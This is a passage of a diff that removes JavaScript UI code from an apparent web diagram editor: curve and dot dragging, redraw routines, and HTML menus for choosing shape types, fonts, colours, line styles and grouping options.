-            var d = [allCurves[tnum].x - x,allCurves[tnum].y - y];
-            var ds = d[0]*d[0] + d[1]*d[1];
-            if (ds > 4)
-            {
-                for (var i=0; i < allCurves[tnum].points.length; i++)
-                {
-                    for (var j=0; j < 2; j++)
-                    {
-                        allCurves[tnum].points[i][j] -= d[j];
-                    }
-                }
-                allCurves[tnum].redraw();
-            }
-            else
-            {
-                mdia(tnum,4);
-            }
-        }
-       document.body.appendChild(dv);
-   }
-
-   this.drawDot = function(x,y,i)
-   {
-       var w = this.thick, h = this.thick;
-       x-=this.thick/2;y-=this.thick/2;
-       var dv = document.createElement("div");
-       dv.id = "g" + this.num +"_" + this.kk++;
-       dv.style.cssText = "z-index:1;position:absolute;left:"+ x +"px;top:"+y +"px;width:" + w +"px;height:" + h +"px;border-radius:" + (this.thick/2) + "px;background-color:" + colors[this.color] +";padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:1px";
-       dv.innerHTML = "<!---->";
-       Drag.init(dv);
-       dv.onDragStart = function(x,y)
-       {
-
-       }
-       dv.onDragEnd = function(x,y)
-       {
-            var i = parseInt(this.id.substring( this.id.indexOf("_")+1 ) );
-            var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-            allCurves[tnum].points[i] = [x,y];
-            allCurves[tnum].redraw();
-       }
-       document.body.appendChild(dv);
-   }
-
-   this.remove = function(k,r)
-   {
-      var z;
-      if ( (z = $('c' + this.num)) != null)
-      {
-         document.body.removeChild(z);
-         if (r == 'c')
-         {
-             this.draw();
-         }
-      }
-      if ( k ==null)
-      {
-          for (var j = 0; j < this.k; j++)
-          if ( (z = $('c' + this.num +"_" + j)) != null)
-          {
-              document.body.removeChild(z);
-          }
-          for (j = 0; j <  this.kk; j++)
-          if ( (z = $('g' + this.num +"_" + j)) != null)
-          {
-               document.body.removeChild(z);
-          }
-      }
-      else
-      {
-          if (k < this.k && r== 'c')
-          {
-             z   = $('c'  + this.num +"_" + k);
-             if (z!=null) document.body.removeChild(z);
-             this.remove(k+1, 'c');
-           //setTimeout(s, 5);
-          }
-          else if (k== this.k && r== 'c')
-          {
-              this.remove(0, 'g');
-          }
-          else if (k < this.kk && r=='g')
-          {
-             z   = $( 'g' + this.num + "_" + k);
-             if (z!=null) document.body.removeChild(z);
-             this.remove(k+1, 'g');
-          }
-          else if (k== this.kk && r=='g')
-          {
-              this.draw();
-          }
-      }
-   }
-   this.delme = function()
-   {
-       this.remove();
-       allCurves[this.num] = null;
-       if (chatsessionnum== -1 && this.num== numCurves-1)
-         numCurves--;
-   }
-   this.redraw = function()
-   {
-      this.remove(0,'c');
-   } 
-   this.draw();
-}
-
-
-function current(lnum)
-{
-    currentlnum = lnum;
-}
-function redrawl(x,y)
-{
-   var l = allLines[currentlnum];
-   if (l.startnum== -1)
-   {
-      l.sx = x;
-      l.sy = y;
-
-   }
-
-   l.redraw();
-   canceldia(currentlnum,2);
-}
-function redraw2(num,d)
-{
-    for (var i=0; i < numsselected.length; i++)
-    {
-              num = numsselected[i];
-              var l = allLines[num];
-             l.direct = d;
-             l.redraw();
-
-    }
-     canceldia(num,2);
-}
-
-function removehint(t, hint)
-{
-    if (t.value == hint)
-    {
-        t.style.color = 'black';
-        t.value = '';
-    }
-}
-
-function showhint(t, hint)
-{
-    if (t.value == '')
-    {
-        t.style.color = 'grey';
-        t.value = hint;
-    }
-}
-function thesame(num,cd)
-{
-    var i = whichally(num,cd);
-    if (i==-1) return false;
-    if (cd == 1)
-    {
-    var x = "," + allies[pagenum][i] + ",";
-    for (num=0; num < numsselected.length; num++)
-        x = x.replace(new RegExp("," + numsselected[num] + ","), ",");
-    return x == ",";
-    }
-    else if (cd == 4)
-    {
-    var x =  allies[pagenum][i] + ",";
-    for (num=0; num < numsselected.length; num++)
-        x = x.replace(new RegExp("," + numsselected[num] + ","), ",");
-    return x == "c,";
-    }
-}
-var bgmouseentered ;
-function choosebg(sel,num,cd)
-{
-    if (innewkframe) return;
-    bgmouseentered=false;
-     var tbl = sel.parentNode.parentNode;
-      if (tbl.tagName.toLowerCase() != 'table')
-      {
-          tbl = sel.parentNode.parentNode.parentNode;
-      }
-      var iii = 0;
-      for (var j=0; j < tbl.rows.length; j++)
-      for (var i=0; i < tbl.rows[j].cells.length; i++)
-      {
-          tbl.rows[j].cells[i].style.border = '1px transparent solid';
-          if (tbl.rows[j].cells[i]==sel)
-              iii = j*tbl.rows[0].cells.length + i;
-      }
-    sel.style.border = '1px orange solid';
-    
-    var  xx = "<table style=\"margin:0px\" ><tr><td width=20  onmouseenter=\"if(bgmouseentered)closeprompt1()\"><!---></td><td  onmouseenter=\"javascript:bgmouseentered=true\"><table  style=margin:0px  cellspacing=0 cellpadding=0 border=1 style=\"border-collapse:collapse;border-color:grey;border:1px #444 solid\">";
-    var nc = Math.ceil(Math.sqrt(hw.numlets)); if (nc>8) nc = 8;
-    var nr = Math.ceil(hw.numlets/nc);
-    var wd = 300; if (nc==2) wd = 150; else if (nc>2) wd =100;
-    var kk=1;
-    for (var ii=0; ii < nr; ii++)
-    {
-       xx += "<tr height=100>";
-     
-       for (var jj=0; jj < nc; jj++)
-       {
-          if (kk <= hw.numlets)
-          {  //this," + num  + "," + cd + "," + i + "
-              xx += "<td width=" + wd + "><div class=shapebg" + kk + " onclick=changecolorb(this," + num + "," + cd + "," + (10+kk)  + ") style=\"width:100%;height:100px\"><!----></div></td>";
-              kk++;
-          }
-          else
-              xx += "<td></td>";
-       }
-       xx += "</tr>";
-    }
-    xx +="</table></td><td width=20  onmouseenter=\"if(bgmouseentered)closeprompt1()\"></td></tr><tr height=15><td colspan=3 onmouseenter=\"if(bgmouseentered)closeprompt1()\" ></td></tr></table>";
-    myprompt(xx,null,null,textmsg[1493]);
-    promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0].cells[0].onclick= closeprompt1;
-    //promptwin.getElementsByTagName('table')[0].rows[1].cells[1].onmouseenter = function(){};
-    //promptwin.getElementsByTagName('table')[0].rows[1].cells[1].onmouseout = closeprompt1;
-}
-function mmdia(num,cd)
-{
-    mdia(num,cd); 
-    var xx = $('m' + num + "_" + cd);
-    if (cd==1)
-    {
-    xx.style.left = (allShapes[num].x + 90) + 'px';
-    xx.style.top = (allShapes[num].y) + 'px';
-    allShapes[num].visible = 1;
-    allShapes[num].base.style.visibility = 'visible';
-    } else if (cd==2)
-    {
-    xx.style.left = (allLines[num].sx + 90) + 'px';
-    xx.style.top = (allLines[num].sy) + 'px';
-    
-    
-    } else if (cd==4)
-    {
-    xx.style.left = (allCurves[num].x + 90) + 'px';
-    xx.style.top = (allCurves[num].y) + 'px';
-     
-    }
-    closeprompt1();
-}
-function mdia(num,cd )
-{
-       var mss = textmsg[1786].split(/@/);
-       var xs = textmsg[1773].split(/@/);
-       if (num<0 || cd==1 && num>=allShapes.length || cd==2 && num>=allLines.length )
-       {
-           myprompt(textmsg[1657] + "<br>" + num +  "," + cd);
-           return;
-       }
-       if (cd!=cdbeing && cdbeing!=-1) return;
-       if (cd==0 && numsselected!=null && numsselected.length==1) return;
-       cdbeing = cd;
-       if (numsselected==null)
-       {
-           numsselected = [];
-       }
-       for (var i=0; i < numsselected.length; i++)
-           if (numsselected[i] == num) break;
-       if (i == numsselected.length)
-       {
-           numsselected[i] = num;
-       }
-       if (hasone!=null) document.body.removeChild(hasone);
-       var dv = document.createElement("div");
-       dv.id = "m" + num + "_" + cd;
-       hasone = dv;
-
-       dv.style.cssText = "position:absolute;left:"+ myHintx +"px;top:"+ myHinty +"px;border:2px #444 solid;background-image:linear-gradient(-45deg,#ccc,#bbb,#eee,#aaa);z-index:" + ( 3*numShapes+3) + ";border-radius:4px;box-shadow:-" + (numsselected.length*2-2) + "px -" + (numsselected.length-1) + "px #777";
-       var str = "<table style=\"font-size:12px\" border=0><tr><td  >               </td></tr>";
-       if(editable && (cd== 1) )
-       {
-           str += "<tr id=mdiatitle><td><table align=center   cellspacing=0 cellpadding=0><tr><td align=left>(#" + num + ")&nbsp;</td><td  style=color:blue onclick=edit(" + num + ")>" + xs[0] + "</td></tr></table></td></tr>";
-       }
-       else if(editable && (cd== 2 || cd==4 ))
-       {
-           str += "<tr id=mdiatitle><td><table align=center   cellspacing=0 cellpadding=0><tr><td align=left>(#" + num + ")&nbsp;</td><td  style=color:blue  > </td></tr></table></td></tr>";
-       }
-       var icons = [
-         "<div style=\"width:12px;height:8px;border:1px blue solid;border-radius:0px\"><!----></div>",
-         "<div style=\"width:12px;height:8px;border:1px blue solid;border-radius:3px\"><!----></div>",
-        "&#9711;",
-         "<div style=transform:scale(1.4,0.8)>O</div>",
-         "<div style=\"width:14px;height:10px;background-color:blue;border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;\">",
-        "<div style=transform:scale(1.8,0.9);color:blue;>" + diamondchar +"</div>",
-        "&#11041;",
-        "&#x2601;"];  
-      
-       if (  cd== 1)
-       {
-            str += "<tr><td><table align=center width=100%  cellspacing=0 cellpadding=0 style=\"border:1px #555 solid\"><tr>";
-            str += "<td   valign=middle align=center width=25%  style=\"color:blue;" + ((allShapes[num]!=null && allShapes[num].shapename=='rightrect')?'border:1px orange solid':'') + "\" onclick=redraw3(" + num +   ",'rightrect'," + cd + ")>" + icons[0] +"</td>";
-            str += "<td   valign=middle align=center width=25%  style=\"color:blue;" + ((allShapes[num]!=null && allShapes[num].shapename=='roundrect')?'border:1px orange solid':'') + "\" onclick=redraw3(" + num +   ",'roundrect'," + cd + ") >" + icons[1] +"</td>";
-            str += "<td   valign=middle align=center  width=25%   style=\"font-size:12px;color:blue;" + ((allShapes[num]!=null && allShapes[num].shapename=='circle')?'border:1px orange solid':'') + "\"  onclick=redraw3(" + num +   ",'circle'," + cd + ")>" + icons[2] +"</td>";
-            str += "<td   valign=middle align=center  width=25%   style=\"font-size:14px;color:blue;" + ((allShapes[num]!=null && allShapes[num].shapename=='ellipse')?'border:1px orange solid':'') + "\"  onclick=redraw3(" + num +   ",'ellipse'," + cd + ")>" + icons[3] +"</td></tr><tr height=13>";
-            str += "<td   valign=middle align=center  width=25%  style=\"font-size:12px;color:blue;" + ((allShapes[num]!=null && allShapes[num].shapename=='egg')?'border:1px orange solid':'') + "\"   onclick=redraw3(" + num +   ",'egg'," + cd + ")>" + icons[4] +"</td>";
-            str += "<td   valign=middle align=center  width=25%  style=\"font-size:13px;color:blue;" + ((allShapes[num]!=null && allShapes[num].shapename=='diamond')?'border:1px orange solid':'') + "\"   onclick=redraw3(" + num +   ",'diamond'," + cd + ")>" + icons[5] +"</td>";
-            str += "<td   valign=middle align=center  width=25%  style=\"transform:rotate(90deg);font-size:14px;color:blue;" + ((allShapes[num]!=null && allShapes[num].shapename=='hexgon')?'border:1px orange solid':'') + "\"   onclick=redraw3(" + num +   ",'hexgon'," + cd + ")>" + icons[6] +"</td>";
-            str += "<td   valign=middle align=center  width=25%  style=\"font-size:14px;color:blue;" + ((allShapes[num]!=null && allShapes[num].shapename=='clouds')?'border:1px orange solid':'') + "\"   onclick=redraw3(" + num +   ",'clouds'," + cd + ")>" + icons[7] +"</td>";
-            str +="</tr></table></td></tr>";
-       }
-       else if (cd == 5)
-       {
-           //str += "<tr><td>" + textmsg[1639].split(/@/)[4] + "</td></tr>";
-           str += "<tr><td align=center><select name=selfont onchange=selectfontname(this)>";
-           var fns = textmsg[1594].split(/@/);
-         var ii = 0;
-         for(var   l =0; l < fns.length; l++)
-         {
-             str += "<option value=\"" + fns[l] + "\"  " + (samefont(cachedfontfamily, fns[l])?'selected':'') + ">" + fns[l].replace(/,.*/,'') + "</option>"
-
-         }
-         str += "</select></td></tr>"
-       }
-       if (cd== 1 || cd==5)
-       {
-            var mini = -1;
-            if (cd == 5)
-            {
-                str += "<tr><td width=90><table align=center cellpadding=0 cellspacing=0><tr><td><nobr>" + mss[1] + "</nobr></td><td id=orient style=color:blue onclick=changeorient(this)>&uarr;</td></tr></table></td></tr>";
-            }
-            else
-            {
-                var tt= parseInt(allShapes[num].base.style.fontSize.replace(/px/,''));
-                var minm = 1000000;
-                if (cd == 1)
-                for (var i=0; i <  allfonts.length; i++)
-                {
-                    if (minm > Math.abs(allfonts[i]-tt))
-                    {
-                        minm = Math.abs(allfonts[i]-tt);
-                        mini = i;
-                    }
-                }
-            }
-            str += "<tr><td><table width=100% align=center cellpadding=0 cellspacing=0 style=\"border:1px #555 solid\"><tr height=14>";
-            for (var i=0; i <  allfonts.length; i++)
-            {
-                str  += "<td  width=25%  align=center valign=middle style=\"color:blue;font-size:13px;" ;
-                if (mini == i)
-                    str += ";font-weight:700;border:1px orange solid";
-                str   += "\"  onclick=\"changefont(this," + num  + "," + cd + "," + i + ")\">" + allfonts[i] +"</td>\n";
-                if (i==allfonts.length/2-1)
-                {
-                   str  += "</tr>\n<tr height=14>";
-                }
-            }
-            str  += "</tr></table></td></tr>";
-       }
-       else if (cd== 2)
-       {
-           str += "<tr><td align=center><table width=100% style=\"border:1px #555 solid\" align=center cellpadding=0 cellspacing=0 border=0><tr height=14>";//changefont(this," + num  + ")>";
-            for ( i=0; i <  4; i++)
-            {
-
-                str += "<td  width=25%  align=center valign=middle style=\"color:" + (allLines[num]!=null? colors[allLines[num].color]:'black');
-                if (allLines[num]!=null && allLines[num].type == arrows[i])
-                    str += ";border:2px orange inset"
-                var pn = picname(arrows[i]);
-                if (pn == '') pn = '---';else if (pn=='arrow'||pn=='>') pn = '&rarr;';
-                else if (pn == 'm') pn = '--m';else   pn = '--'+pn;
-                str += "\"  onclick=changelinetype(" + i +"," + num  + ","+ cd + ")><nobr>" + pn + "</nobr></td>\n";
-            }
-            str  += "</tr></table></td></tr>";
-
-            str += "<tr><td  align=center><table style=\"border:1px #555 solid\" width=100% align=center cellpadding=0 cellspacing=0 border=0><tr height=14>";//changefont(this," + num  + ")>";
-            for ( i=1; i <= 4; i++)
-            {
-                str += "<td  width=25%  align=center valign=middle ";
-                if (allLines[num].thick == i)
-                    str += "style=\"border:2px orange inset\"";
-                str += "  onclick=changethick(" + i +"," + num  + ","+ cd + ")><div style=\"width:12px;height:" + i +"px;background-color:" + (allLines[num]!=null?colors[allLines[num].color]:'') + "\">" + fillblank + "</div></td>\n";
-            }
-            str  += "</tr></table></td></tr>";
-       }
-       else if (cd== 4)
-       {
-            str += "<tr><td  align=center><table style=border-collapse:collapse width=100% align=center cellpadding=0 cellspacing=0 border=1><tr height=14>";//changefont(this," + num  + ")>";
-            for ( i=1; i <= 4; i++)
-            {
-                str += "<td  width=20  align=center valign=middle ";
-                if (allCurves[num].thick== i)
-                    str += "style=\"border:2px orange inset\"";
-                str += "  onclick=changethick(" + i +"," + num  + ","+ cd + ")><div style=\"width:12px;height:" + i +"px;background-color:" + colors[allCurves[num].color] + "\">" + fillblank + "</div></td>\n";
-            }
-            str  += "</tr></table></td></tr>";
-       }
-      if (cd==1   ||  cd==0  || cd == 5  )
-      {
-            var ww = 11;if (cd== 0) ww = 16;
-
-            if (cd==1)
-                var vv=  allShapes[num].bcolor;
-            else if (cd == 0)
-            {
-                var uu = getdocbg();
-                if (!isNaN(uu.charAt(0)))
-                {
-                    vv =  (parseInt(uu.replace(/ .*/,'')) + 10);
-                }
-                else
-                    vv = hexcolor(document.body.style.backgroundColor);
-            }
-            else
-                vv = -1;
-            if (cd == 5)
-            {
-                str += "<tr  valign=bottom><td  align=center><table  width=100% align=center cellpadding=0 cellspacing=0 ><tr><td><nobr>" + mss[2] + "</nobr></td><td><input  id=hiddencolorb type=color style=\"width:1px;visibility:hidden;height:10px\" onchange=changethatcolor(this,'b')></td></tr></table></td></tr>";
-            }
-            str += "<tr><td  valign=top><table  width=100% align=center cellpadding=0 cellspacing=0 border=1><tr height=" + ww +">";
-            var  N1 = 8;
-            if (cd != 5) N1 = bcolors.length;
-            for (  i=0; i < N1; i++)
-            {
-               str  += "<td width=" + ww +" style=\"background-color:" + bcolors[i]
-               if ( (cd==1 && ( vv==i%100 || vv-i*100 < 100 && vv >= 100 )) || (cd==0 && vv==hexcolor(bcolors[i]) ) )
-                   str += ";border:1px orange solid";
-               else
-                   str += ";border:1px transparent solid";
-               if (i < 9)
-                  str  += "\"    onclick=changecolorb(this," + num  + "," + cd + "," + i + ")><!----></td>\n";
-               else if (hw.numlets>0)
-                  str  += "\" class=shapebg" + (vv>10?(vv-10):1) + "  onclick=choosebg(this," + num  + "," + cd + ")><!----></td>\n";
-               else
-                   str  += "\" style=\"background-color:white\" ><!----></td>\n";
-               if (i== N1/2-1)
-               {
-                   str  += "</tr>\n<tr height=" + ww +">";
-               }
-            }
-           // bcolors[bcolors.length-1] = hold;
-            str  += "</tr></table></td></tr>";
-      }
-
-       if (cd==1 || cd==2 || cd==4 || cd == 5 || cd==0)
-       {
-            if (cd == 5)
-            {
-                str += "<tr  valign=bottom><td ><table  width=100% align=center cellpadding=0 cellspacing=0 ><tr><td><nobr>" + mss[3] + "</nobr></td><td><input id=hiddencolorf type=color style=\"width:1px;height:15px;height:10px;visibility:hidden\" onchange=changethatcolor(this,'f')></td></tr></table></td></tr>";
-            }
-            str += "<tr  valign=bottom><td><table  width=100% align=center cellpadding=0 cellspacing=0 border=1><tr height=" + 10 +">";
-            var uu = -1;
-            if (cd == 0)
-                uu = menufontcolor;
-            else if (cd== 1)
-                uu=  allShapes[num].color;
-            else if (cd== 2)
-                uu = allLines[num].color;
-            else if (cd== 4)
-                uu = allCurves[num].color;
-            for (  i=0; i < colors.length; i++)
-            {
-               str  += "<td  width=25%  align=center valign=middle style=\"font-size:14px;font-weight:700;color:" + colors[i]
-               if (uu==i)
-                   str += ";border:1px orange solid";
-               else
-                  str += ";border:1px transparent solid";
-               str  += "\"  onclick=changecolor(this," + num  + "," + cd + "," + i  +")>" + ((cd==1||cd==5 || cd==0)?'a':('<div style=background-color:' + colors[i] +";width:13px;height:3px><!----></div>")) +"</td>\n";
-               if (i== colors.length/2-1)
-               {
-                   str  += "</tr>\n<tr height=14>";
-               }
-            }
-            str  += "</tr></table></td></tr>";
-            if (cd== 2)
-            {
-            str += "<tr><td><table align=center style=\"border:1px #555 solid\" width=100%  cellspacing=0 cellpadding=0 border=0><tr height=20>";
-            str += "<td   valign=middle align=center width=25% " + (allLines[num].direct==0?'style="border:1px orange solid"':'') +" onclick=redraw2(" + num +   ",0)><div style=\"background-color:" + (allLines[num]!=null?colors[allLines[num].color]:'black') + ";width:20px;height:2px;transform: rotate(41deg);\"><!----></div></td>"
-            str += "<td   valign=middle align=center width=25%  " + (allLines[num].direct==1?'style="border:1px orange solid"':'') +" onclick=redraw2(" + num +   ",1)><div style=\"background-color:transparent;margin:1px 1px 1px 1px;width:17px;height:12px;border-left-width:2px;border-left-color:" + (allLines[num]!=null?colors[allLines[num].color]:'black') + ";;border-left-style:solid;border-bottom-width:2px;border-bottom-color:" + (allLines[num]!=null?colors[allLines[num].color]:'black') + ";border-bottom-style:solid;\"><!----></div></td>"
-            str += "<td   valign=top style=\"padding:1px\"   width=25%  " + (allLines[num].direct==2?'style="border:1px orange solid"':'') +" onclick=redraw2(" + num +   ",2)><div style=\"color:" + (allLines[num]!=null?colors[allLines[num].color]:'black') + ";;width:20px;transform: rotate(41deg);\">-----</div></td>"
-            str += "<td   valign=middle align=center  width=25%  " + (allLines[num].direct==3?'style="border:1px orange solid"':'') +" onclick=redraw2(" + num +   ",3)><div style=\"background-color:transparent;margin:1px 1px 1px 1px;width:17px;height:12px;border-left-width:2px;border-left-color:" + (allLines[num]!=null?colors[allLines[num].color]:'black') + ";;border-left-style:dotted;border-bottom-width:2px;border-bottom-color:" + (allLines[num]!=null?colors[allLines[num].color]:'black') + ";border-bottom-style:dotted;\"><!----></div></td>"
-            str +="</tr></table></td></tr>";
-            }
-       }
-        if (cd==1)
-        {
-            str += "<tr  valign=bottom><td><table  width=100% align=center cellpadding=0 cellspacing=0 border=1><tr height=" + 10 +">";
-            str  += "<td width=" + ww +" style=\"border:" +  ((allShapes[num].fc & 1) > 0?'1':'0') + "px orange solid\" title=\"" + xs[1] + "\" onclick=\"changeframewidth(" + num + ",true,this)\" align=center valign=middle><div style=\"width:12px;height:9px;background-color:blue\"><!----></div></td>";
-            str  += "<td width=" + ww +" style=\"border:" +  ((allShapes[num].fc & 2) > 0?'1':'0') + "px orange solid;text-shadow:2px 2px #333\" title=\"" + xs[2] + "\" onclick=\"changeshadow(" + num + ",true,this)\" align=center valign=middle><div style=\"box-shadow:1px 1px #881122;width:12px;height:9px;background-color:blue\"><!----></div></td>";
-            str  += "<td width=" + ww +" style=\"border:" +  ((allShapes[num].fc & 4) > 0?'1':'0') + "px orange solid;text-shadow:2px 2px #333;color:blue;font-size:14px\" title=\"" + xs[14] + "\" onclick=\"changeTshadow(" + num + ",true,this)\" align=center  valign=middle>a</td>";
-             str  += "<td width=" + ww +" style=\"border:" +  ((allShapes[num].fc & 8) > 0?'1':'0') + "px orange solid;\" title=\"" + mss[4] + "\" onclick=\"changegradient(" + num + ",true,this)\" align=center><div style=width:12px;height:10px;background-image:linear-gradient(#fff,#000)><!----></div></td></tr>";
-            str  += "<tr height=" + 10 +"><td width=" + ww +" style=\"border:" +  ((allShapes[num].fc & 1) == 0?'1':'0') + "px orange solid\" title=\"&cross;" + xs[1] + "\"   onclick=\"changeframewidth(" + num + ",false,this)\" align=center  valign=middle>&rect;</td>";
-            str  += "<td width=" + ww +" style=\"border:" +  ((allShapes[num].fc & 2) == 0?'1':'0') + "px orange solid;\" title=\"&cross;" + xs[2] + "\"   onclick=\"changeshadow(" + num + ",false,this)\" align=center  valign=middle><div style=width:12px;height:9px;background-color:blue><!----></div></td>";
-            str  += "<td width=" + ww +" style=\"border:" +  ((allShapes[num].fc & 4) == 0?'1':'0') + "px orange solid;color:blue;font-size:14px\" title=\"&cross;" + xs[14] + "\"  onclick=\"changeTshadow(" + num + ",false,this)\" align=center  valign=middle>a</td>";
-             str  += "<td width=" + ww +" style=\"border:" +  ((allShapes[num].fc & 8) == 0?'1':'0') + "px orange solid;\" title=\"&cross;" + mss[4] + "\"   onclick=\"changegradient(" + num + ",false,this)\" align=center><div style=width:12px;height:9px;background-color:#888><!----></div></td></tr>";
-          
-           str  += "</tr></table></td></tr>";
-           str += "<tr><td style=\"padding:0px 0px 0px 0px;color:blue\" ><span style=\"font-size:16px;color:"+(allShapes[num].words.length>0&&allShapes[num].urlas=='circular'?'#0000cc':'#666699') + ";visibility:" + (cd==1 && allShapes[num].shapename=='circle'?'visible':'hidden') + "\" onclick=circulartext(" + num + ",this)>&#10686;</span><input style=\"margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;width:10px;visibility:hidden\">" + xs[15].replace(/ /g,'') + "<input style=\"margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;width:16px;color:black;border:1px grey solid;width:25px;text-align:right\" name=slope type=text value=" +  (allShapes[num].slope) + " onchange=\"changeslope(" + num + ",this)\">&deg;</td></tr>";
-        }
-        if (cd== 4)
-        {
-            str += "<tr><td><table align=center style=\"border:1px #555 solid\" width=100% cellspacing=0 cellpadding=0 border=0><tr height=20>";
-            str += "<td   valign=middle align=center width=16% " +   (allCurves[num].type=='curve'?'style="border:1px orange solid"':'') +" onclick=redraw4(" + num +    ",'curve')><div style=\"color:" + (allCurves[num]!=null?colors[allCurves[num].color]:'black') + ";\">&ac;</div></td>"
-            str += "<td   valign=middle align=center width=17%  " +  (allCurves[num].type=='mline'?'style="border:1px orange solid"':'') +" onclick=redraw4(" + num +    ",'mline')><div style=\"color:" + (allCurves[num]!=null?colors[allCurves[num].color]:'black') + ";\">&ang;</div></td>"
-            str += "<td   valign=middle align=center width=16%  " + (allCurves[num].type=='dotted'?'style="border:1px orange solid"':'') +" onclick=redraw4(" + num +   ",'dotted')><div style=\"color:" + (allCurves[num]!=null?colors[allCurves[num].color]:'black') + ";\">&homtht;</div></td>"
-            str += "<td   valign=middle align=center width=17%  " + (allCurves[num].type=='dotline'?'style="border:1px orange solid"':'') +" onclick=redraw4(" + num +  ",'dotline')><div style=\"color:" + (allCurves[num]!=null?colors[allCurves[num].color]:'black') + "\" >&there4;</div></td>"
-            str += "<td   valign=middle align=center width=17%  " + (allCurves[num].type=='smooth'?'style="border:1px orange solid"':'') + " onclick=redraw4(" + num +  ",'smooth')><div style=\"color:" + (allCurves[num]!=null?colors[allCurves[num].color]:'black') + ";\">&acd;</div></td>"
-            str += "<td   valign=middle align=center width=17%  " + (allCurves[num].type=='dsmooth'?'style="border:1px orange solid"':'') +" onclick=redraw4(" + num +  ",'dsmooth')><div style=\"color:" + (allCurves[num]!=null?colors[allCurves[num].color]:'black') + "\" >&minusd;</div></td>"
-            str +="</tr></table></td></tr>";
-        }
-        var NN = 0;
-        str += '<tr><td><table cellpading=0 cellspacing=0 align=center width=100%>';
-        if (cd== 1 || cd== 4)
-        {
-           var mm = whichally(num,cd);
-           var formally =  (editable  && (numsselected!=null && numsselected.length>1 && !thesame(num,cd)));
-           var exitally = (mm >= 0);
-           var selally =   (editable  && mm >= 0 && allies[pagenum][mm].replace(/[0-9]/g,'').length!=numsselected.length-1);
-           if (formally  && !exitally && !selally)
-           {
-               if ((NN%2) == 0) str += '<tr height=16>';
-               str += "<td   style=color:blue onclick=formally(" + num +"," + cd + ") >" + xs[16] + "</td>";
-               if ((++NN%2) == 0) str += '</tr>';
-           }
-           else if (!formally  &&  exitally && !selally)
-           {
-
-               if ((NN%2) == 0) str += '<tr height=16>';
-               str += "<td width=50%  style=color:blue><div class=upto2 style=line-height:16px;overflow:hidden ><table width=100% cellpadding=0 cellspacing=0><tr><td ><font color=black>" + xs[16] + "</font></td></tr><tr><td   style=color:blue onclick=exitally1(this," + num + "," + cd + ") >" + xs[17] + "</td></tr></table></div></td>";
-               if ((++NN%2) == 0) str += '</tr>';
-           }
-           else if (!formally  && !exitally && selally)
-           {
-               if ((NN%2) == 0) str += '<tr height=16>';
-               str += "<td width=50%  style=color:blue><div class=upto2 style=line-height:16px;overflow:hidden ><table width=100% cellpadding=0 cellspacing=0><tr><td ><font color=black>" + xs[16] + "</font></td></tr><tr><td   style=color:blue onclick=selally(this," + num + "," + cd + ") >" + textmsg[1849].replace(/@.*/,'') + "</td></tr></table></div></td>";
-               if ((++NN%2) == 0) str += '</tr>';
-           }
-           else if (formally  && exitally && !selally)
-           {
-               if ((NN%2) == 0) str += '<tr height=16>';
-               str += "<td width=50%  style=color:blue><div class=upto2 style=line-height:16px;overflow:hidden ><table width=100% cellpadding=0 cellspacing=0><tr><td onclick=formally(" + num +"," + cd + ") >" + xs[16] + "</td></tr><tr><td  onclick=exitally1(this," + num + "," + cd  +") >" + xs[17] + "</td></tr></table></div></td>";
-               if ((++NN%2) == 0) str += '</tr>';
-           }
-           else if (formally  &&  !exitally && selally)
-           {
-               if ((NN%2) == 0) str += '<tr height=16>';
-               str += "<td width=50%  style=color:blue><div class=upto2  style=line-height:16px;overflow:hidden ><table width=100% cellpadding=0 cellspacing=0><tr><td onclick=formally(" + num+"," + cd + ") >" + xs[16] + "</td></tr><tr><td  onclick=selally(this," + num +"," + cd + ") >" + textmsg[1849].replace(/@.*/,'') + "</td></tr></table></div></td>";
-               if ((++NN%2) == 0) str += '</tr>';
-           }
-           else if (!formally  && exitally && selally)
-           {
-               if ((NN%2) == 0) str += '<tr height=16>';
-               str += "<td width=50%  style=height:16px;color:blue ><div class=upto2  style=line-height:16px;overflow:hidden ><table width=100% cellpadding=0 cellspacing=0><tr><td  ><font color=black>" + xs[16] + "</font></td></tr><tr><td  onclick=exitally1(this," + num + "," + cd + ") >" + xs[17] + "</td></tr><tr><td  onclick=selally(this," + num + ") >" + textmsg[1849].replace(/@.*/,'') + "</td></tr></table></div></td>";
-               if ((++NN%2) == 0) str += '</tr>';
-           }
-           else if (formally  && exitally && selally)
-           {
-               if ((NN%2) == 0) str += '<tr height=16>';
-               str += "<td  width=50% style=height:16px;color:blue ><div class=upto3  style=line-height:16px;overflow:hidden ><table width=100% cellpadding=0 cellspacing=0><tr><td onclick=formally(" + num+"," + cd + ") >" + xs[16] + "</td></tr><tr><td  onclick=exitally1(this," + num + "," + cd + ") >" + xs[17] + "</td></tr><tr><td  onclick=selally(this," + num + ") >" + textmsg[1849].replace(/@.*/,'') + "</td></tr></table></div></td>";
-               if ((++NN%2) == 0) str += '</tr>';
-           }
-           //xs[18] = Emerging@     xs[19]=State  xs[20]=Trajectory xs[21]=Time  xs[22]=Loop xs[23]=Showing xs[24]=Leaving
-           //var kframes = [];// kframes['5_4'] = {esn:1, ets:[[1,2]], etm:5, ssn:1, sts:[[1,2]], stm:5, loop:3, lsn:1, lts:[[1,2]], ltm:5};
-           //var kshapes = [];
-       }
-       if (cd== 1 )
-        {
-
-
-            if (allShapes[num].words.indexOf("<img ") > 0)
-            if (editable)
-           {
-               if (NN%2 == 0) str += '<tr>';
-               str += "<td   style=color:blue onclick=delpic(" + num +   ")>" + xs[12] + "</td>";
-               if ((++NN%2) == 0) str += '</tr>';
-            }
-            if (NN%2 == 0) str += '<tr>';
-            str += "<td   style=color:blue onclick=\"switchshow(" + num + ");canceldia(" + num + ",1);\"> " + ((allShapes[num].visible==1)?xs[3]:xs[26]) + "</td>";
-             if ((++NN%2) == 0) str += '</tr>';
-             if ( (allShapes[num].shapename=='roundrect' || allShapes[num].shapename=='rightrect' )  && issql(allShapes[num].words))
-            {
-                if (NN%2 == 0) str += '<tr>';
-                str += " <td   style=color:blue onclick=dosql(" + num + ")>SQL</td> ";
-                if ((++NN%2) == 0) str += '</tr>';
-            }
-            else if ((allShapes[num].shapename=='rightrect' || allShapes[num].shapename=='roundrect')   && iscpp(allShapes[num].words))
-            {
-                if (NN%2 == 0) str += '<tr>';
